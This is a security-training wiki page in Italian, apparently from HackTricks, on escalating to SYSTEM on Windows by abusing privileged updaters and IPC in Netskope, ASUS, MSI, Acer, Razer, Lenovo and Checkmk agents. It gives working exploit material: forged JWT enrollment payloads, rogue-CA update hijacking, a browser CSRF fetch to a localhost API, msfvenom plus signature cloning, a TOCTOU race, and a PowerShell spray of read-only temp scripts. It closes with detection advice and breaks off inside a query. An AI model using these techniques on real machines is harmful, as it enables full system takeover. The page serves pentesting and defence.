# Abusare degli auto-updater aziendali e dell'IPC con privilegi (ad es., Netskope, ASUS e MSI)

{{#include ../../banners/hacktricks-training.md}}

Questa pagina generalizza una classe di catene di escalation dei privilegi locali in Windows individuate negli agent endpoint e negli updater aziendali che espongono una superficie IPC facilmente accessibile e un flusso di aggiornamento con privilegi. Un esempio rappresentativo è Netskope Client per Windows < R129 (CVE-2025-0309), in cui un utente con privilegi limitati può forzare l'enrollment verso un server controllato dall'attaccante e quindi fornire un MSI malevolo che il servizio SYSTEM installa.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Idee chiave riutilizzabili contro prodotti simili:
- Abusare dell'IPC localhost di un servizio con privilegi per forzare un nuovo enrollment o la riconfigurazione verso un server dell'attaccante.
- Implementare gli endpoint di aggiornamento del vendor, fornire una Trusted Root CA non autorizzata e indirizzare l'updater verso un pacchetto malevolo “firmato”.
- Eludere controlli deboli sul signer (allow-list CN), flag digest facoltativi e proprietà MSI permissive.
- Se l'IPC è “crittografato”, ricavare la chiave/IV da identificatori della macchina leggibili da tutti e memorizzati nel registry.
- Se il servizio limita i chiamanti in base al percorso dell'immagine o al nome del processo, eseguire l'injection in un processo consentito oppure avviarne uno in stato sospeso e inizializzare la DLL tramite una modifica minima del contesto del thread.

Anche i servizi TCP locali personalizzati richiedono la stessa analisi dell'identità e dei confini degli input, anche quando richiedono un PIN o altre credenziali applicative. Associa il listener al relativo processo e all'account di servizio effettivo, quindi esamina il binario/la versione effettivamente distribuiti e verifica se i campi controllati dal chiamante vengono sottoposti a controlli di lunghezza prima di essere copiati in buffer fissi o usati per costruire il comando di un processo figlio. Le [indicazioni di Microsoft sul buffer overrun](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) spiegano perché gli input esterni non verificati sono pericolosi nel codice nativo con privilegi. Un listener loopback, una credenziale hardcoded o il solo nome di un processo non dimostrano la presenza di corruzione della memoria né l'esecuzione come SYSTEM; raggiungibilità, autorizzazione, percorso del codice e mitigazioni restano condizioni distinte. Mantieni passiva l'enumerazione di routine, invece di inviare a un servizio attivo input di lunghezza tale da causare un crash.

---
## 1) Forzare l'enrollment verso un server dell'attaccante tramite IPC localhost

Molti agent includono un processo UI in modalità utente che comunica con un servizio SYSTEM tramite TCP localhost usando JSON.

Osservato in Netskope:
- UI: stAgentUI (integrità bassa) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Flusso dell'exploit:
1) Crea un token di enrollment JWT con claim che controllano l'host backend (ad es., AddonUrl). Usa alg=None per non richiedere alcuna firma.
2) Invia il messaggio IPC che richiama il comando di provisioning con il tuo JWT e il nome del tenant:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Il servizio inizia a inviare richieste al tuo server malevolo per enrollment/config, ad esempio:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Note:
- Se la verifica del chiamante si basa sul percorso/nome, invia la richiesta da un binario del vendor presente nell'allowlist (vedi §4).<sup>[[1]](#references)[[2]](#references)</sup>

### IPC di gestione esposto in rete

Questo confine di fiducia non è sempre limitato a localhost. Nel caso segnalato di MyReport Updater 2.1.1, un servizio `LocalSystem` era in ascolto su tutte le interfacce e accettava una modifica non autenticata della configurazione gRPC per l'host di riferimento, la porta e la modalità operativa. Per la variante remota erano necessari sia l'accesso di rete al listener sia l'accesso in uscita dal servizio al riferimento scelto. Valuta questi aspetti separatamente dalla possibilità che il successivo flusso del pacchetto superi il confine di scrittura dei file.<sup>[[16]](#references)</sup>

---
## 2) Dirottare il canale di aggiornamento per eseguire codice come SYSTEM

Una volta che il client comunica con il tuo server, implementa gli endpoint previsti e indirizzalo a un MSI controllato dall'attaccante. Sequenza tipica:

1) /v2/config/org/clientconfig → Restituisci una configurazione JSON con un intervallo di aggiornamento molto breve, ad esempio:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Restituisce un certificato CA PEM. Il servizio lo installa nell'archivio Trusted Root del computer locale.
3) /v2/checkupdate → Fornisce metadati che puntano a un MSI malevolo e a una versione falsa.

Come aggirare i controlli comuni osservati sul campo:
- Allow-list del CN del signer: il servizio potrebbe limitarsi a verificare che il Subject CN sia uguale a “netSkope Inc” o “Netskope, Inc.”. La tua CA rogue può emettere un certificato leaf con quel CN e firmare l'MSI.
- Proprietà CERT_DIGEST: includi una proprietà MSI innocua denominata CERT_DIGEST. Non viene verificata al momento dell'installazione.
- Verifica facoltativa del digest: un flag di configurazione (ad es. check_msi_digest=false) disabilita la convalida crittografica aggiuntiva.

Risultato: il servizio SYSTEM installa il tuo MSI da
C:\ProgramData\Netskope\stAgent\data\*.msi
eseguendo codice arbitrario come NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Lezione sull'aggiramento delle patch: se un vendor reagisce inserendo in allow-list un piccolo insieme di domini “trusted”, invece di autenticare crittograficamente la fonte degli aggiornamenti, cerca redirector o reverse proxy di proprietà del vendor che permettano comunque di dirigere il traffico. Nel caso di Netskope, ricerche pubbliche successive hanno mostrato che una allow-list dell'era R129 poteva ancora essere aggirata tramite `rproxy.goskope.com`, che faceva da proxy per contenuti Azure App Service controllati dall'attaccante. Considera le allow-list di hostname come un ostacolo, non come un confine di fiducia.<sup>[[14]](#references)</sup>

Un altro tipo di vulnerabilità è rappresentato dai **metadati del pacchetto coerenti tra loro, ma non autenticati**. Nel caso MyReport, un riferimento controllato dall'attaccante forniva un archivio modificato, mentre un intermediario alterava il digest MD5 e le risposte relative alle dimensioni del vendor prima che raggiungessero l'updater. La corrispondenza di quei valori verificava la coerenza delle risposte, non la loro provenienza dal vendor; non era necessario alcun MD5 collision. Una directory di installazione scelta dal chiamante trasformava poi l'estrazione privilegiata in un confine di scrittura dei file. La primitiva di DLL loading risultante è trattata in [chaining an arbitrary file write into DLL hijacking](dll-hijacking/#chaining-an-arbitrary-file-write-into-a-missing-dll-hijack).<sup>[[16]](#references)</sup>

---
## 3) Forgiare richieste IPC crittografate (se presenti)

A partire da R127, Netskope ha racchiuso il JSON IPC in un campo encryptData dall'aspetto simile a Base64. Il reverse engineering ha rivelato l'uso di AES con chiave/IV derivati da valori del registro leggibili da qualsiasi utente:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Gli attaccanti possono riprodurre la crittografia e inviare comandi validi e crittografati da un utente standard.<sup>[[1]](#references)[[2]](#references)</sup> Suggerimento generale: se un agent inizia improvvisamente a “crittografare” il proprio IPC, cerca ID dispositivo, GUID di prodotto e ID di installazione sotto HKLM.

---
## 4) Aggirare le allow-list dei chiamanti IPC (controlli di percorso/nome)

Alcuni servizi provano ad autenticare il peer individuando il PID della connessione TCP e confrontando il percorso/nome dell'immagine con i binari del vendor inseriti in allow-list e situati sotto Program Files (ad es., stagentui.exe, bwansvc.exe, epdlp.exe).

Due metodi pratici per aggirarli:
- DLL injection in un processo inserito in allow-list (ad es., nsdiag.exe) e proxy IPC dall'interno del processo.
- Avviare un binario inserito in allow-list in stato sospeso e caricare la propria proxy DLL senza CreateRemoteThread (vedi §5), rispettando così le regole anti-tamper applicate dal driver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection compatibile con la protezione anti-tamper: processo sospeso + patch NtContinue

Spesso i prodotti includono un driver minifilter/callback OB (ad es., Stadrv) per rimuovere i diritti pericolosi dagli handle ai processi protetti:
- Processo: rimuove PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: limita i diritti a THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Un loader user-mode affidabile che rispetta questi vincoli:
1) Eseguire CreateProcess di un binario del vendor con CREATE_SUSPENDED.
2) Ottenere gli handle ancora consentiti: PROCESS_VM_WRITE | PROCESS_VM_OPERATION sul processo e un handle del thread con THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (oppure solo THREAD_RESUME, se si applica la patch al codice in un RIP noto).
3) Sovrascrivere ntdll!NtContinue (o un altro thunk iniziale certamente mappato) con uno stub minimale che chiama LoadLibraryW sul percorso della propria DLL, quindi esegue un salto all'indietro.
4) Eseguire ResumeThread per attivare lo stub all'interno del processo e caricare la DLL.

Poiché non hai usato PROCESS_CREATE_THREAD o PROCESS_SUSPEND_RESUME su un processo già protetto (lo hai creato tu), la policy del driver viene rispettata.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Strumenti pratici
- NachoVPN (plugin Netskope) automatizza la creazione di una CA rogue, la firma di un MSI malevolo e l'esposizione degli endpoint necessari: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope è un client IPC personalizzato che crea messaggi IPC arbitrari (facoltativamente crittografati con AES) e include l'injection di un processo sospeso per originare la richiesta da un binario inserito in allow-list.<sup>[[4]](#references)</sup>

## 7) Workflow rapido di triage per superfici updater/IPC sconosciute

Quando analizzi un nuovo endpoint agent o una suite di “helper” per schede madri, di solito basta un workflow rapido per capire se hai davanti un promettente target di privesc:<sup>[[6]](#references)</sup>

1) Elencare i listener loopback e ricondurli ai processi del vendor:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Elenca le named pipe candidate:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Estrai i dati di instradamento archiviati nel Registro e usati dai server IPC basati su plugin:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Estrai prima i nomi degli endpoint, le chiavi JSON e gli ID dei comandi dal client in modalità utente. I frontend Electron/.NET impacchettati spesso fanno leak dell'intero schema:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Individua la condizione di trust effettiva, non solo il percorso del codice che alla fine avvia il processo:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Pattern da prioritizzare:
- `CryptQueryObject`/parsing dei certificati senza `WinVerifyTrust` di solito significa che «il certificato esiste» è stato trattato come «il certificato è attendibile», consentendo la clonazione di certificati o altri trucchi con falsi firmatari.
- I controlli basati su sottostringhe/suffissi su `Origin`, `Referer`, URL di download, nomi dei processi o CN dei firmatari non sono autenticazione. `contains(".vendor.com")` è di solito sfruttabile con domini simili controllati dall’attaccante.
- Se la GUI con privilegi bassi decide che «il file è attendibile» e il broker SYSTEM si limita a usare quel risultato, modificare o reimplementare la DLL/JS lato client spesso aggira del tutto il confine (validazione divisa in stile Razer).
- Se il broker copia un payload in `%TEMP%`/`C:\Windows\Temp` e poi lo convalida o lo pianifica da quel percorso, verifica subito le finestre di sostituzione TOCTOU e la presenza di moduli plugin adiacenti che espongono wrapper `ExecuteTask()` alternativi con controlli più deboli.<sup>[[6]](#references)</sup>

Per i target che fanno ampio uso di named pipe, PipeViewer è un modo rapido per individuare DACL deboli e pipe raggiungibili da remoto prima di iniziare a fare reverse engineering approfondito del protocollo.<sup>[[11]](#references)</sup>

Se il target autentica i chiamanti solo tramite PID, percorso dell’immagine o nome del processo, considera questo controllo un ostacolo, non un confine: iniettarsi nel client legittimo o effettuare la connessione da un processo autorizzato è spesso sufficiente a superare i controlli del server. Per le named pipe nello specifico, [questa pagina sull’impersonificazione del client e l’abuso delle pipe](named-pipe-client-impersonation.md) approfondisce il primitivo.

Per un **broker di cleanup o ripristino privilegiato**, esamina il confine di fiducia dei percorsi oltre all’ACL della pipe. Un chiamante con privilegi inferiori potrebbe essere in grado di selezionare una destinazione di ripristino o rinominare un artefatto di backup temporaneo in una directory condivisa, anche se l’eseguibile del servizio e la sua directory di installazione sono protetti. Verifica separatamente che il chiamante possa raggiungere il comando di ripristino, modificare l’input temporaneo esatto o il nome del file, che il broker venga eseguito con un’identità superiore e che l’operazione di ripristino scriva effettivamente nel percorso protetto selezionato. Una directory temporanea scrivibile o una pipe leggibile, da sole, non dimostrano la possibilità di scrivere arbitrariamente con privilegi elevati; la mappatura della destinazione e il comportamento del servizio devono essere verificati tramite code review o test controllati. Non eseguire un comando di cleanup sconosciuto durante l’enumerazione passiva, perché potrebbe eliminare file dell’utente.

---
## 8) Broker di add-in modulari autenticati solo tramite firme del vendor (schema Lenovo Vantage)

Una variante più recente da cercare è il **broker RPC con client firmato**: un processo desktop Lenovo firmato con privilegi bassi comunica con un servizio SYSTEM, che instrada comandi JSON verso un insieme di add-in descritti in XML sotto `%ProgramData%`. Una volta ottenuta l’esecuzione di codice **all’interno di un qualsiasi client firmato accettato**, ogni contratto `runas="system"` entra nella superficie di attacco.<sup>[[15]](#references)</sup>

Primitive di alto valore osservate nella ricerca su Lenovo Vantage:
- **Fidarsi del chiamante perché è firmato dal vendor**: i ricercatori hanno raggiunto un contesto autenticato copiando un EXE firmato da Lenovo in una directory scrivibile e soddisfacendo un DLL side-load (`profapi.dll`), così da eseguire codice arbitrario all’interno di un client già considerato attendibile dal servizio.
- **Individuazione della superficie di attacco tramite manifest**: gli add-in sono dichiarati in `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; diversi contratti vengono eseguiti come `SYSTEM`, quindi enumerare questi manifest spesso rivela le vere operazioni privilegiate più rapidamente del reverse engineering del broker stesso.
- **Bug per singolo comando dietro il canale autenticato**: una volta all’interno del client attendibile, la ricerca pubblica ha individuato path traversal e race condition nei comandi di aggiornamento/installazione, abuso di SQL grezzo nei database privilegiati delle impostazioni e controlli dei percorsi del registro basati su sottostringhe che consentivano scritture al di fuori dell’hive previsto.

Attività di ricognizione utile su un target:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Indicazione pratica: ogni volta che una suite di helper espone un broker che autentica prima il **processo chiamante** e solo dopo inoltra le richieste a decine di comandi plugin/add-in, non fermarti dopo aver aggirato il controllo di fiducia iniziale. Estrai la tabella manifest/contract e fai fuzzing indipendentemente su ogni verbo con privilegi elevati; il canale autenticato nasconde spesso diversi bug di seconda fase.

---
## 1) CSRF dal browser a localhost contro API HTTP privilegiate (ASUS DriverHub)

DriverHub distribuisce un servizio HTTP in modalità utente (ADU.exe) su 127.0.0.1:53000, che si aspetta chiamate dal browser provenienti da https://driverhub.asus.com. Il filtro dell’origine esegue semplicemente `string_contains(".asus.com")` sull’header Origin e sugli URL di download esposti da `/asus/v1.0/*`. Qualsiasi host controllato dall’attaccante, come `https://driverhub.asus.com.attacker.tld`, supera quindi il controllo e può inviare richieste che modificano lo stato tramite JavaScript.<sup>[[6]](#references)</sup> Consulta le [nozioni di base sulla CSRF](../../pentesting-web/csrf-cross-site-request-forgery.md) per ulteriori modalità di bypass.

Procedura pratica:
1) Registra un dominio che includa `.asus.com` e ospita lì una pagina web malevola.
2) Usa `fetch` o XHR per chiamare un endpoint privilegiato (ad es. `Reboot`, `UpdateApp`) su `http://127.0.0.1:53000`.
3) Invia il corpo JSON previsto dall’handler: il JS frontend compresso mostra lo schema riportato di seguito.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Anche la CLI di PowerShell mostrata di seguito ha esito positivo quando l'header Origin viene spoofato impostandolo sul valore attendibile:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Qualsiasi visita del browser al sito dell’attaccante diventa quindi un CSRF locale con un clic (o senza clic, tramite `onload`) che attiva un helper con privilegi SYSTEM.

---
## 2) Verifica insicura della firma del codice e clonazione del certificato (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` scarica eseguibili arbitrari definiti nel corpo JSON e li memorizza nella cache in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. La convalida dell’URL di download riutilizza la stessa logica basata su sottostringhe, quindi `http://updates.asus.com.attacker.tld:8000/payload.exe` viene accettato. Dopo il download, ADU.exe si limita a verificare che il PE contenga una firma e che la stringa Subject corrisponda ad ASUS prima di eseguirlo: non usa `WinVerifyTrust` e non convalida la catena.

Per sfruttare il flusso:
1) Crea un payload (ad es., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clona la firma del firmatario ASUS nel payload (ad es., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Ospita `pwn.exe` su un dominio simile a `.asus.com` e attiva UpdateApp tramite il CSRF del browser descritto sopra.

Poiché sia i filtri Origin e URL sono basati su sottostringhe e il controllo del firmatario confronta solo stringhe, DriverHub scarica ed esegue il binario dell’attaccante con privilegi elevati.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU nei percorsi di copia/esecuzione dell’updater (MSI Center CMD_AutoUpdateSDK)

Il servizio SYSTEM di MSI Center espone un protocollo TCP in cui ogni frame è composto da `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Il componente principale (Component ID `0f 27 00 00`) include `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Il relativo handler:
1) Copia l’eseguibile fornito in `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifica la firma tramite `CS_CommonAPI.EX_CA::Verify` (il subject del certificato deve essere uguale a “MICRO-STAR INTERNATIONAL CO., LTD.” e `WinVerifyTrust` deve avere esito positivo).
3) Crea un’attività pianificata che esegue il file temporaneo come SYSTEM con argomenti controllati dall’attaccante.

Il file copiato non viene bloccato tra la verifica e `ExecuteTask()`. Un attaccante può:
- Inviare il Frame A indicando un binario MSI legittimo (garantisce il superamento del controllo della firma e l’accodamento dell’attività).
- Inviargli in parallelo ripetuti messaggi Frame B che indicano un payload malevolo, sovrascrivendo `MSI Center SDK.exe` subito dopo il completamento della verifica.

Quando parte l’attività pianificata, viene eseguito il payload sovrascritto come SYSTEM, nonostante sia stato convalidato il file originale. Per uno sfruttamento affidabile, si usano due goroutine/thread che inviano ripetutamente CMD_AutoUpdateSDK finché non si vince la finestra TOCTOU.<sup>[[6]](#references)</sup>

---
## 2) Abuso dell’IPC personalizzato a livello SYSTEM e impersonificazione (MSI Center + Acer Control Centre)

### Set di comandi TCP di MSI Center
- Ogni plugin/DLL caricato da `MSI.CentralServer.exe` riceve un Component ID memorizzato in `HKLM\SOFTWARE\MSI\MSI_CentralServer`. I primi 4 byte di un frame selezionano quel componente, consentendo agli attaccanti di instradare comandi verso moduli arbitrari.
- I plugin possono definire i propri task runner. `Support\API_Support.dll` espone `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` e chiama direttamente `API_Support.EX_Task::ExecuteTask()` **senza convalidare la firma**: qualsiasi utente locale può indicargli `C:\Users\<user>\Desktop\payload.exe` e ottenere in modo deterministico l’esecuzione come SYSTEM.
- Analizzare il traffico loopback con Wireshark o strumentare i binari .NET in dnSpy permette di individuare rapidamente la corrispondenza tra Component e comando; in seguito, client personalizzati in Go/Python possono riprodurre i frame.<sup>[[6]](#references)</sup>

### Named pipe di Acer Control Centre e livelli di impersonificazione
- `ACCSvc.exe` (SYSTEM) espone `\\.\pipe\treadstone_service_LightMode` e la sua ACL discrezionale consente l’accesso a client remoti (ad es., `\\TARGET\pipe\treadstone_service_LightMode`). L’invio dell’ID comando `7` insieme a un percorso di file richiama la routine del servizio che avvia i processi.
- La libreria client serializza un byte terminatore speciale (113) insieme agli argomenti. La strumentazione dinamica con Frida/`TsDotNetLib` (consulta [Strumenti di reverse engineering e metodi di base](../../reversing/reversing-tools-basic-methods/README.md) per suggerimenti sulla strumentazione) mostra che l’handler nativo associa questo valore a un `SECURITY_IMPERSONATION_LEVEL` e a un SID di integrità prima di chiamare `CreateProcessAsUser`.
- Sostituendo 113 (`0x71`) con 114 (`0x72`), si entra nel ramo generico che mantiene il token SYSTEM completo e imposta un SID di integrità elevata (`S-1-16-12288`). Il binario avviato viene quindi eseguito come SYSTEM senza restrizioni, sia localmente sia tra macchine.
- Combinando questo comportamento con il flag di installazione esposto (`Setup.exe -nocheck`), è possibile installare ACC anche su VM di laboratorio e provare la pipe senza hardware del produttore.<sup>[[6]](#references)</sup>

Questi bug IPC evidenziano perché i servizi localhost devono imporre l’autenticazione reciproca (SID ALPC, filtri `ImpersonationLevel=Impersonation`, filtraggio dei token) e perché l’helper di ogni modulo che “esegue binari arbitrari” deve applicare le stesse verifiche del firmatario.

---
## 3) Helper “elevator” COM/IPC basati su convalida debole in user mode (Razer Synapse 4)

Razer Synapse 4 ha introdotto un altro schema utile di questa famiglia: un utente con privilegi limitati può chiedere a un helper COM di avviare un processo tramite `RzUtility.Elevator`, mentre la decisione di attendibilità è delegata a una DLL in user mode (`simple_service.dll`) anziché essere applicata in modo robusto all’interno del perimetro privilegiato.

Percorso di sfruttamento osservato:
- Istanzia l’oggetto COM `RzUtility.Elevator`.
- Chiama `LaunchProcessNoWait(<path>, "", 1)` per richiedere l’avvio con privilegi elevati.
- Nella PoC pubblica, il controllo della firma PE all’interno di `simple_service.dll` viene rimosso tramite patch prima di inviare la richiesta, consentendo l’avvio di un eseguibile arbitrario scelto dall’attaccante.<sup>[[6]](#references)[[10]](#references)</sup>

Invocazione minima da PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Considerazione generale: quando esegui il reverse engineering di suite “helper”, non fermarti a TCP localhost o alle named pipe. Cerca classi COM con nomi come `Elevator`, `Launcher`, `Updater` o `Utility`, quindi verifica se il servizio privilegiato convalida effettivamente il file binario di destinazione oppure si limita a fidarsi di un risultato calcolato da una DLL client in modalità utente modificabile. Questo schema si applica anche oltre Razer: qualsiasi architettura divisa in cui il broker con privilegi elevati utilizza una decisione di allow/deny proveniente dal lato con privilegi inferiori è una potenziale superficie di privesc.


---
## Esecuzione prevedibile di script temporanei durante la riparazione MSI (Checkmk Agent / CVE-2024-0670)

Alcuni agent Windows eseguono ancora azioni privilegiate scrivendo un file `.cmd` temporaneo in `C:\Windows\Temp` ed eseguendolo come `SYSTEM`. Se il nome del file è prevedibile e il servizio non ricrea in modo sicuro i file già esistenti, un utente con privilegi limitati può creare in anticipo il futuro file temporaneo in modalità **sola lettura** e fare in modo che il processo privilegiato esegua contenuto controllato dall'attaccante invece del proprio script.

Rilevato nelle build vulnerabili di Checkmk Agent:
- pattern del file temporaneo: `cmk_all_<PID>_1.cmd`
- rami interessati: `2.0.0`, `2.1.0`, `2.2.0`
- trigger: **riparazione** MSI del pacchetto dell'agent memorizzato nella cache<sup>[[8]](#references)[[9]](#references)</sup>

Procedura pratica:
1. Stima un intervallo realistico di PID usando gli ID dei processi attuali o il PID dell'agent in esecuzione.
2. Scrivi un payload `.cmd` breve in **ASCII** (`Set-Content -Encoding Ascii` o reindirizzamento di `cmd.exe`; evita l'output PowerShell in UTF-16 per i file batch).
3. Esegui uno spray di `C:\Windows\Temp\cmk_all_<PID>_1.cmd` nell'intervallo candidato e imposta ogni file in modalità sola lettura.
4. Attiva una riparazione dell'MSI memorizzato nella cache, in modo che il servizio privilegiato tenti di rigenerare lo script temporaneo e poi lo esegua.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Se il prodotto vulnerabile è installato tramite Windows Installer, associa il file MSI memorizzato nella cache dall'aspetto casuale in `C:\Windows\Installer` al nome del prodotto prima di avviare la riparazione:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Note operative:
- `qwinsta` è utile quando `msiexec /fa` non funziona da una shell WinRM non interattiva e serve capire se una sessione desktop esistente o disconnessa può avviare correttamente la riparazione.<sup>[[7]](#references)</sup>
- Questo schema si applica anche ad altri agent e updater endpoint che **preparano script temporanei in percorsi scrivibili da tutti e poi li eseguono come SYSTEM**. Verifica la presenza di nomi prevedibili, l'assenza di semantiche di creazione esclusiva e di flussi di riparazione/aggiornamento attivabili on demand.

### Riparazione interattiva dell'installer e console con privilegi

PDF24 Creator 11.15.1 illustra un rischio distinto legato alla riparazione MSI: durante la riparazione, la custom action di installazione della stampante può avviare una console visibile con privilegi SYSTEM. Il vendor ha modificato l'MSI installer nella versione 11.15.2 per risolvere questo comportamento. Una versione precedente del prodotto è solo un indizio per il triage. Verifica il pacchetto MSI registrato o raggiungibile, se l'utente può avviare la riparazione, se sono presenti la custom action vulnerabile e il ritardo del file di log, e se un desktop interattivo può mostrare la console. Il ritardo segnalato utilizzava un oplock su `faxPrnInst.log`; la normale scrivibilità del file non è l'unica condizione di accesso. Una shell non interattiva, un pacchetto inaccessibile o un installer aggiornato possono interrompere la catena. Questo problema non dipende da `AlwaysInstallElevated` ed è diverso dalla sostituzione di uno script temporaneo con un nome prevedibile.

---
## Hijack remoto della supply chain tramite convalida debole dell'updater (WinGUp / Notepad++)

Tra giugno 2025 e dicembre 2025, gli aggressori che avevano compromesso l'infrastruttura di hosting alla base del flusso di aggiornamento di Notepad++ hanno distribuito selettivamente manifest malevoli a vittime specifiche. Gli updater meno recenti basati su WinGUp non verificavano completamente l'autenticità degli aggiornamenti, quindi una risposta XML ostile poteva reindirizzare i client a URL controllati dagli aggressori. Poiché il client accettava contenuti HTTPS senza verificare sia una catena di certificati attendibile sia una firma PE valida sull'installer scaricato, le vittime scaricavano ed eseguivano un `update.exe` NSIS trojanizzato.<sup>[[12]](#references)[[13]](#references)</sup>

Flusso operativo (non è necessario alcun exploit locale):
1. **Intercettazione dell'infrastruttura**: comprometti la CDN/l'hosting e rispondi alle richieste di aggiornamento con metadati controllati dagli aggressori che puntano a un URL di download malevolo.
2. **NSIS trojanizzato**: l'installer scarica/esegue un payload e sfrutta due catene di esecuzione:
   - **Bring-your-own signed binary + sideload**: includi il file firmato `BluetoothService.exe` di Bitdefender e inserisci un `log.dll` malevolo nel suo percorso di ricerca. Quando viene eseguito, il binario firmato carica tramite sideload `log.dll`, che decritta e carica in modo riflessivo la backdoor Chrysalis (protetta da Warbird e con hashing delle API per ostacolare il rilevamento statico).
   - **Iniezione di shellcode tramite script**: NSIS esegue uno script Lua compilato che usa API Win32 (ad es. `EnumWindowStationsW`) per iniettare shellcode e predisporre Cobalt Strike Beacon.<sup>[[12]](#references)</sup>

Indicazioni per l'hardening e il rilevamento di qualsiasi updater:
- Imposta la **verifica di certificato + firma** dell'installer scaricato (fissa il signer del vendor, rifiuta CN/catene non corrispondenti) e firma il manifest di aggiornamento stesso (ad es. XMLDSig). Blocca i redirect controllati dal manifest se non sono stati convalidati.
- Considera il **sideloading di un binario firmato BYO** come un pivot di rilevamento post-download: genera un alert quando un EXE firmato del vendor carica una DLL con un nome proveniente da un percorso diverso da quello canonico dell'installazione (ad es. Bitdefender che carica `log.dll` da Temp/Downloads) e quando un updater inserisce/esegue installer da percorsi temporanei con firme non appartenenti al vendor.
- Monitora gli **artefatti specifici del malware** osservati in questa catena (utili come pivot generici): mutex `Global\Jdhfv_1.0.1`, scritture anomale di `gup.exe` in `%TEMP%` e fasi di iniezione di shellcode avviate tramite Lua.
- Notepad++ ha risposto rafforzando WinGUp nella versione v8.8.9 e successive: ora l'XML restituito è firmato (XMLDSig) e le build più recenti verificano certificato + firma dell'installer scaricato anziché fidarsi solo del trasporto.<sup>[[13]](#references)</sup>

<details>
<summary>Cortex XDR XQL – sideloading di <code>log.dll</code> tramite EXE firmato da Bitdefender (T1574.001)</summary>

```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
